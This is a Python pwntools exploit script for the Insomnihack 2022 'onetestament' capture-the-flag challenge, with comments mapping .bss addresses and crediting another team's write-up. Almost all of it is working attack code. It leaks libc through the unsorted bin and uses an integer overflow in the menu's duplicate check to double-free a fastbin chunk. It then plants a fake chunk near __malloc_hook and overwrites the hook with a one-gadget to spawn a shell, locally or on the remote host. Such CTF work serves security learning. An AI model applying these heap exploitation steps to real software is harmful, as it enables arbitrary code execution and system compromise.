#!/usr/bin/env python3
#I didn't solve the challenge during the CTF: I didn't know I had to preserve the size-field integrity when linking fake chunks into the fastbins.
#Thnx to s3nn/CYberMouflons for the 0x70 fake chunk near __malloc_hook suggestion:
#https://cybermouflons.com/insomnihack-teaser2022-onetestament/


#In .bss:
#0x303160 : ptr_testaments
#0x3030c8 : testaments
#0x3030cc : num_testaments
#0x303120 : num_size

#Testaments dup check in .bss
#0x3030c4 : dup1
#0x3030c0 : dup2
#0x3030bc : dup3
#0x3030b8 : dup4 -> integer overflow with menu choice: 4294967295
#0x3030b0 : dup5
#0x3030ac : dup6
#0x3030a8 : dup7
#0x3030a4 : dup8
#0x3030a0 : dup9



from pwn import *

exe = ELF("onetestament_alarm_patched")
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.binary = exe
context.log_level='debug'


def conn():
    if args.REMOTE:
        io = remote("onetestament.insomnihack.ch", 6666)
    else:
        io = process([exe.path])
        if args.DEBUG:
            gdb.attach(io)

    return io

def add(size, content):
#1: 0x18 - 24 bytes
#2: 0x30 - 48 bytes
#3: 0x60 - 96 bytes
#4: 0x7c - 124 bytes
    io.sendlineafter(b'choice: ', b'1')
    io.sendlineafter(b'choice: ', size.encode('utf-8'))
    io.sendlineafter(b'content: ', content)

def free(idx):
    io.sendlineafter(b'choice: ', b'4')
    io.sendlineafter(b'index: ', idx.encode('utf-8'))
    
def edit(idx, content):
    io.sendlineafter(b'choice: ', b'3')
    io.sendlineafter(b'index: ', idx.encode('utf-8'))
    io.sendlineafter(b'content: ', content)


io = conn()

add(str(1),chr(0x43)*4) #0
add(str(4),chr(0x42)*4) #1 #Goes to unsorted bins for libc leak
add(str(3),chr(0x43)*4) #2

free(str(0))
free(str(1))
#edit(str(0),b'0')
#edit(str(0),b'0')
edit(str(0),b'24') #Change block 1 size to leak libc 
edit(str(0),b'24')
add(str(4),str('')) #3
io.recvuntil(b'My new testament: \n')
leak = io.recvuntil(b'\n')
leak = u64(leak[:5].rjust(6,b'\x00').ljust(8,b'\x00'))
libc.address = leak - libc.sym.__memalign_hook
info("Libc base:%#x", libc.address)
info("Malloc hook:%#x", libc.sym.__malloc_hook) 

add(str(3),chr(0x45)*4) #4
add(str(3),chr(0x45)*4) #5

free(str(4))
free(str(5))
io.sendlineafter(b'choice: ', b'4294967293') #Overflow 4th testament dup check 
free(str(4))

add(str(3),p64(libc.sym.__malloc_hook - 0x23)) #0x70 fake chunk near __malloc_hook. Find with pwndbg: find_fake_fast &__malloc_hook
add(str(3),str('deadbeef')) 
add(str(3),str('deadbeef')) 
add(str(3), p8(0) * 0x13 + p64(libc.address + 0x4527a)) #padding 0x23 - fake chunk header = 0x13. And One gadget

io.sendlineafter(b'choice: ', b'1')
io.sendlineafter(b'choice: ', b'1') #Malloc to freedom

io.interactive()
